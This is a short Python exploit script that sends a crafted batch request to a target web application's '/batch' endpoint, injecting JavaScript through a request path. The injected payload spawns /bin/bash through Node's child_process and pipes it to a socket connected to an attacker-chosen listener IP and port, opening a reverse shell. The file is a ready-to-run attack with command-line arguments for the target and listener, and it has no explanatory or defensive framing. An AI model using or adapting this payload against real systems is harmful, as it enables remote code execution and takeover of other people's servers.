import sys, requests, argparse

s = requests.Session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def delivery(ip, lhost, lport):
	target = "http://%s/batch" % ip
	cmd = "\\\\x2fbin\\\\x2fbash"
	payload = "var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\');" % cmd
	payload += "var client = new net.Socket();"
	payload += "client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);" % (lport, lhost)
	payload += "sh.stderr.pipe(client);});"
	req = '{"requests":[{"method":"get","path":"/profile"},{"method":"get","path":"/item"},{"method":"get","path":"/item/$1.id;%s"}]}' % payload
	req = s.post(target, req, proxies=proxies)
	res = req.text
	if req.status_code == 200:
		print("\n[+] Payload delivered.")
		print(res)
	else:
		print("\n[!] Unexpected error.")

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--lhost', help='Local listener IP address', required=True)
	parser.add_argument('--lport', help='Local listener port', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5:80/app --lhost 192.168.0.1 --lport 8080" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip
	lhost = args.lhost
	lport = args.lport

	delivery(ip, lhost, lport)

if __name__ == "__main__":
	main()
